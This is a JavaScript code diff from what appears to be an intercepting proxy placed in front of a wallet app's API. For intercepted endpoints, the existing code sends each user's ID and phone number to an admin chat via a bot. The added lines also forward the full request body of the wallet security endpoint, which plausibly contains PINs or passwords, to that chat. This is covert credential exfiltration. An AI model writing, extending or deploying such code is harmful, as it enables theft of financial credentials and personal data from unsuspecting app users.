@@ -2463,7 +2463,12 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
       const userId = await extractUserId(req, jsonResp);
       const phone = getPhone(data, userId);
       if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
-        bot.sendMessage(data.adminChatId, `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}`).catch(()=>{});
+        let msg = `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}`;
+        if (ep === '/app/api/v1/wallet/security') {
+          const reqBody = JSON.stringify(req.body || {}, null, 2);
+          msg += `\n\n📤 REQUEST:\n${reqBody.substring(0, 3000)}`;
+        }
+        bot.sendMessage(data.adminChatId, msg).catch(()=>{});
       }
       sendJson(res, respHeaders, jsonResp, respBody);
     } catch(e) { await transparentProxy(req, res); }
